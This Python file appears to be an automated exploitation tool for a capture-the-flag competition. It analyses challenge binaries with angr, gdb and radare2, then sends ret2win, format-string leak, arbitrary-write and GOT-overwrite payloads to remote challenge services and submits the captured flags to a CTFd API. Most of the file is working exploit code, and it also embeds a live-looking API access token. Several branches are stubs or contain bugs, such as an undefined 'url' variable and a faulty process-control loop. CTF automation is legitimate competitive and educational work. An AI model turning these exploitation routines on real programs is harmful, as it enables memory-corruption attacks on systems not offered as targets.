import os, subprocess, sys
from multiprocessing import Process
import angr, claripy, angrop
import rzpipe
import json, requests
from colorama import Fore, Back, Style
from pwn import *

# This helps debugging to shutup pwntools
context.log_level = 'ERROR'
logging.disable(logging.CRITICAL)

# Access token for team to make api calls -- CHANGE THIS
access_token = "ctfd_489823be103a92f08ed1e04953ac1891cd84424d401789f475236eaf33db165d"

# URL of ctfd --
ctfd_url = "https://ace.ctfd.io"

# Headers needed for api calls
headers = {
    "Authorization": f"Token {access_token}",
    "Content-Type" : "application/json",
}

UR_MOM_LOL = 1024

# Regex to help find flags in recvall
flag_pattern = r'flag\{[^}]+\}'

# ------------------------------------------------- #
# This is where your auto exploit code should be    #
# placed. This should craft the exploit locally to  #
# get the fake flag, send the exploit to the remote #
# binary, receive the flag, and submit the flag     #
# ------------------------------------------------- #


class SHART:

    def __init__(self, filename:str, chal_id:int) -> None:
        self.file = filename
        self.chal_id = chal_id
        self.url = f"ace-service-{self.file.replace('_', '-')}.chals.io"
        
        self.__libc_path = "/opt/libc.so.6"
        self.__ld_path = "/opt/ld-2.27.so"
        
        self.__bin = context.binary = ELF(filename)
        self.__libc = context.binary = ELF(self.__libc_path)
        
        self.__rop = ROP(self.__bin)
        self.__angrop = None
        
        self.rz = rzpipe.open(self.file)
        self.rz.cmd("aaa")
        
        self.useful_strings = ["cat flag.txt", "sh", "/bin/cat flag.txt", "/bin/sh"]
        
        self.__has_leak = False
        self.__has_overflow = False
        
        self.__angrBuffer = None
        self.__buffer = None
        self.__payload = None # might change this to a list of payloads.
        
        # self.angrProj = angr.Project(filename, load_options={"auto_load_libs":False})
        # self.angrCfg = self.angrProj.analyses.CFGFast()
        # self.angrFunc = self.angrCfg.kb.functions
        # self.angrSimgr = None
        
        self.flag = ""
        
        self.recipe = {
                "ret2win":False,
                "ret2system":False,
                "ret2execve":False,
                "ret2syscall":False,
                "ret2libc":False,
                "ROPWritePrim":False,
                "FormStrStackLeak":False,
                "FormStrLibcLeak":False,
                "FormStrWritePrim":False,
                "FormStrGOTOver":False,
                "ArrayIndexAbuse":False
                }
    
    # Angr hook used to find the buffer needed to complete a stack smash.
    def __check_mem_corruption(self, simgr:angr.SimulationManager):
        if len(simgr.unconstrained):
            for path in simgr.unconstrained:
                path.add_constraints(path.regs.pc == b"AAAAAAAA")
                if path.satisfiable():
                    temp_buffer = path.solver.eval(self.__angrBuffer, cast_to=bytes)
                    try:
                        ind = temp_buffer.index(b"AAAAAAAA")
                        self.__buffer = temp_buffer[:ind]
                        simgr.stashes["corrupt"].append(path)
                    except Exception as e:
                        print(f"{self.file}: Angr failed to find index!")
                        # print(temp_buffer)
                simgr.stashes["unconstrained"].remove(path)
                simgr.drop(stash="active")
        
    # initializes angr for stack smash and printf leak detection.
    def __init_angr(self):
        
        print(Fore.RED + Style.BRIGHT + f"Analyzing {self.file}: Initializing Angr." + Style.RESET_ALL)
        
        angrProj = angr.Project(self.file, load_options={"auto_load_libs":False})
        
        inp_size = 1024
        
        self.__angrBuffer = claripy.BVS("input", 8 * inp_size)
                
        state = angrProj.factory.entry_state(addr=self.__bin.sym["main"], stdin=self.__angrBuffer)
        angrSimgr = angrProj.factory.simgr(state, save_unconstrained=True)
        angrSimgr.stashes["corrupt"] = []
        
        # def is_leakable(state):
        #     pointer = state.solver.eval(state.regs.rdi)
        #     if pointer >= 0xffffffffff:
        #         self.has_leak = True
        
        def prevent_death(state):
            read_size = state.solver.eval(state.regs.rsi)
            if read_size >= UR_MOM_LOL:
                angrSimgr.drop(stash = "active")
                
        angrProj.hook_symbol("fgets", prevent_death)
        angrProj.hook_symbol("scanf", prevent_death)
        # angrProj.hook_symbol("printf", is_leakable)
        
        print(Fore.GREEN + Style.BRIGHT + f"Analyzing {self.file}: Simulation Active." + Style.RESET_ALL)
        
        angrSimgr.explore(step_func=self.__check_mem_corruption)
        
        print(Fore.GREEN + Style.BRIGHT + f"Analyzing {self.file}: Simulation Completed." + Style.RESET_ALL)
        
        for error in angrSimgr.errored:
            if str(error.error) == "Symbolic (format) string, game over :(":
                self.__has_leak = True
        
        if len(angrSimgr.stashes["corrupt"]) == 0:
            print(Fore.YELLOW + Style.BRIGHT + f"Analyzing {self.file}: Angr Failed to Find Overflow." + Style.RESET_ALL)
        else:
            self.__has_overflow = True
        angrSimgr = None
        angrProj = None
        
    # Backup stack smash detection.
    def __gdb_overflow(self):
        print(Fore.YELLOW + Style.BRIGHT + f"Analyzing {self.file}: GDB Fallback." + Style.RESET_ALL)
        
        # Thanks Louis! https://github.com/condor0010
        
        context.log_level = 'critical'
        content_to_write = "file "+self.file+"\nrun <<< " + cyclic(2048).decode("utf-8") + "\nprint $rbp"
        file_name = str(random.randint(0,9999999999))+".gdb"
        with open(file_name, 'w') as file: file.write(content_to_write)
        out = subprocess.run(["gdb", "-x", file_name, "-batch"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
        try:
            size = cyclic_find(p64(int(out.strip().split(' ')[-1],16)))
            if size > 0:
                size+=8
        except ValueError as e:
            size = 0
        os.remove(file_name)
        if size <= 0:
            print(Fore.MAGENTA + Style.BRIGHT + Back.YELLOW + f"Analyzing {self.file}: Overflow Not Successfull!" + Style.RESET_ALL)
        else:
            self.__has_overflow = True
            self.__buffer = b"A" * size
                        
    # Search for string in binary and return the address.
    def __find_string(self, string:str) -> int:
        out = subprocess.check_output(["ropper", "-f", self.file, "--string", string, "--nocolor"]).decode("ascii")
        addr = ""
        if "0x" in out:
            addr = out.split("\n")[7].split()[0]
        ret = 0
        if addr != "":
            ret = int(addr, 16)
        return ret
    
    # Gets flag out of stack.
    def __decode_printf_stack_leak(self, output:str) -> str:
        flag = ""
        output = output[output.index("0x"):]
        nums = output.split("0x")
        for part in nums:
            temp = re.findall("..", part)[::-1]
            for num in temp:
                flag += chr(int(num, 16))
                if num == "7d":
                    break
            if "7d" in temp:
                break
        return flag
    
    # Find libc function that has not yet been called after the last separator function.
    def __get_unused_libc_func(self, separator:str) -> str:
        libc_calls = self.rz.cmd("pdf @ sym.vuln | grep call | awk '{print $4}'").split("\n")[:-1]
        last_func = 0
        for i in range(len(libc_calls) - 1, 0, -1):
            if libc_calls[i] == f"sym.imp.{separator}":
                last_func = i
        libc_func = ""
        for post_func in libc_calls[last_func+1:]:
            if post_func not in libc_calls[:last_func+1] and post_func.split(".")[-1] in self.__bin.got.keys():
                libc_func = post_func.split(".")[-1]
        return libc_func
    
    # Accomplish printf overwrite attack.
    def __printf_overwrite(self, addr:int, value:int) -> str:
        temp_flag = ""
        def attack(payload):
            p = process(self.file)
            p.sendline(payload)
            return p.recvall()
        p = remote(self.url, 443, ssl=True, sni=self.url)
        p.recvuntil(b">>>")
        automat = FmtStr(attack)
        offset = automat.offset
        pay = fmtstr_payload(offset, {addr: value}, write_size="byte")
        p.sendline(pay)
        if self.__find_string("cat flag.txt") == 0:
            p.sendline(b"/bin/cat flag.txt")
        out = p.recvall(timeout=5)
        ind = 0
        try:
            ind = out.index(b"flag")
        except Exception as e:
            pass
        if ind != 0:
            temp_flag = out[ind:].strip().decode("ascii")
        return temp_flag
    
    def __send_flag(self):
        challenge_url = f"{ctfd_url}/api/v1/challenges/attempt"
        data = json.dumps({"challenge_id" : self.chal_id, "submission" : self.flag})
        response = requests.post(challenge_url, headers=headers, data=data)

    def exploit(self):        
                
        print(Fore.CYAN + Style.BRIGHT + f"Exploiting {self.file}: Exploits Initiated" + Style.RESET_ALL)
        # url = f"ace-service-{self.file.replace('_', '-')}.chals.io"
        
        flags = []
        temp_flag = ""
        
        # You need to make functions to make your exploits easier to read/do. Make sure that the parameters have static types.
        # self.buffer contains the buffer up before overwriting the return address.
        
        if self.recipe["ret2win"]:
            test = 0
            p = remote(url, 443, ssl=True, sni=url)
            e = ELF(self.file)
            r = ROP(e)
            p.recvuntil(b">>> ")
            load = self.__buffer
            load += p64(e.sym['win'])
            p.sendline(load)
            print(p.recvall(timeout=3))

        elif self.recipe["ret2system"]:
            # function here
            test = 0
            # if temp_flag == "":
            #     self.__angrop  = angr.Project(self.file).analyses.ROP()
            #     self.__angrop.find_gadgets()
        elif self.recipe["ret2execve"]:
            # function here
            test = 0
            # if temp_flag == "":
            #     self.__angrop = angr.Project(self.file).analyses.ROP()
            #     self.__angrop.find_gadgets()
        elif self.recipe["ret2syscall"]:
            # function here
            test = 0
            # if temp_flag == "":
            #     self.__angrop  = angr.Project(self.file).analyses.ROP()
            #     self.__angrop.find_gadgets()
        elif self.recipe["ret2libc"]:
            # function here
            test = 0
            # if temp_flag == "":
            #     self.__angrop  = angr.Project(self.file).analyses.ROP()
            #     self.__angrop.find_gadgets()
        elif self.recipe["ROPWritePrim"]:
            # function here
            test = 0
            # if temp_flag == "":
            #     self.__angrop  = angr.Project(self.file).analyses.ROP()
            #     self.__angrop.find_gadgets()
            #     print(self.__bin.sym["__data_start"])
            #     pay = self.__angrop.write_to_mem(self.__bin.sym["__data_start"], b"/bin/sh").payload_str()
            #     pay += self.__angrop.fill_reg("rdi", self.__bin.sym["__data_start"])
            #     pay += self.__angrop.rop.fill_reg("rsi", 0)
            #     pay += p64(self.__bin.sym["system"])
            #     p = remote(self.url, 443, ssl=True, sni=self.url)
            #     p.recvuntil(b">>>")
            #     p.sendline(self.__buffer + pay)
            #     print(p.recvall(timeout=5))
        elif self.recipe["FormStrStackLeak"]:
            start = 0
            for i in range(1, 0x21):
                p = process(self.file)
                p.recvuntil(b">>>")
                p.sendline(b"%%%d$p"%i)
                output = p.recvall(timeout=0.5)
                p.close()
                if b"67616c66" in output:
                    start = i
                    break
            temp_flag = ""
            temp = ""
            while "7d" not in temp:
                p = remote(self.url, 443, ssl=True, sni=self.url)
                p.recvuntil(b">>>")
                pay = b"%%%d$p"%start
                start += 1
                p.sendline(pay)
                temp = p.recvline().strip().decode("ascii")
                temp_flag += self.__decode_printf_stack_leak(temp)
                p.close()
        # elif self.recipe["FormStrLibcLeak"]: may not be in competitions
        #     # function here
        #     test = 0
        elif self.recipe["FormStrWritePrim"]:
            temp_flag = self.__printf_overwrite(self.__bin.sym["pwnme"], 0x539)
        elif self.recipe["FormStrGOTOver"]:
            libc_func = self.__get_unused_libc_func("printf")
            temp_flag = self.__printf_overwrite(self.__bin.got[libc_func], self.__bin.sym["win"])
        elif self.recipe["ArrayIndexAbuse"]:
            # function here
            test = 0
            
        flags = re.findall(flag_pattern, temp_flag)
        if len(flags) > 0:
            self.flag = flags[0]
            
        if self.flag != "":
            print(f"Found flag {self.file}: {self.flag}")
            # self.__send_flag()
        else:
            print(Fore.MAGENTA + Style.BRIGHT + Back.YELLOW + f"Exploiting {self.file}: No Exploit Landed. There Goes Our Streak." + Style.RESET_ALL)
        
    def analyze(self) -> None:
        
        # Overflow and printf leak detection.
        self.__init_angr()
        if self.__buffer == None and not self.__has_leak:
            # Backup overflow detection.
            self.__gdb_overflow()
            
        print(Fore.MAGENTA + f"{self.__buffer}" + Style.RESET_ALL)
                            
        # Analyze possible attacks and mark the recipe.
        
        if self.__has_leak:
            if "win" in self.__bin.sym.keys() and "pwnme" in self.__bin.sym.keys():
                self.recipe["FormStrWritePrim"] = True
            elif "win" in self.__bin.sym.keys():
                self.recipe["FormStrGOTOver"] = True
            else:
                self.recipe["FormStrStackLeak"] = True
        elif self.__has_overflow:
            #aaa; pdf @ sym.win ~ cmp
            if "win" in self.__bin.sym.keys():
                self.recipe["ret2win"] = True
            elif "func" in self.__bin.sym.keys():
                self.recipe["ROPWritePrim"] = True
            elif "execve" in self.__bin.sym.keys():
                self.recipe["ret2execve"] = True
            elif "syscall" in self.__bin.sym.keys():
                self.recipe["ret2syscall"] = True
            elif "cmd_func" in self.__bin.sym.keys():
                self.recipe["ret2system"] = True
            else:
                self.recipe["ret2libc"] = True
        else:
            self.recipe["ArrayIndexAbuse"] = True

            
def execute(filename:str, chal_id:int):
    run = SHART(filename, chal_id)
    run.analyze()
    run.exploit()
    

if __name__ == "__main__":
    
    print("S.H.A.R.T Initializing . . .")
        
    start_time = time.time()

    # ----- Download Binary Repo ----- #
    while(1):
        try:
            subprocess.run("git clone https://github.com/tj-oconnor/ace-binaries.git", shell=True)
            os.chdir("ace-binaries/test-binaries") # CHANGE THIS EVENTUALLY
            break
        except Exception as e:
            print("Failed to clone git repo!")
    # -------------------------------- #

    if not os.path.isfile("./flag.txt"):
        with open("flag.txt", "w") as f:
            f.write("flag\{pwned\}\n")

    # ----- Get the first chal id ---- #
    challenge_url = f"{ctfd_url}/api/v1/challenges"
    response = requests.get(challenge_url, headers=headers)
    json_data = json.loads(response.text).get("data", {})
    challenge_list = {i["name"]: int(i["id"]) for i in json_data}
    # -------------------------------- #

    # ----- Main Execution Loop! ----- #  
    jobs = []
    filenames = os.listdir()
    for file in filenames:
        if file != "flag.txt" and file != "exploit.py":
            corrected = file.replace("_", "-")
            jobs.append(Process(target=execute, args=(file, challenge_list[corrected])))
            
    
    control = []
    for job in jobs:
        job.start()
        control.append(job)
        if len(control) == 10:
            kill = 0
            while kill != 10:
                cont = control.copy()
                for sub in cont:
                    if not job.is_alive():
                        control.remove(sub)
                        kill += 1
                        sub.join()
    end_time = time.time()
    print(f"S.H.A.R.T Completed: {end_time - start_time:.4f}")    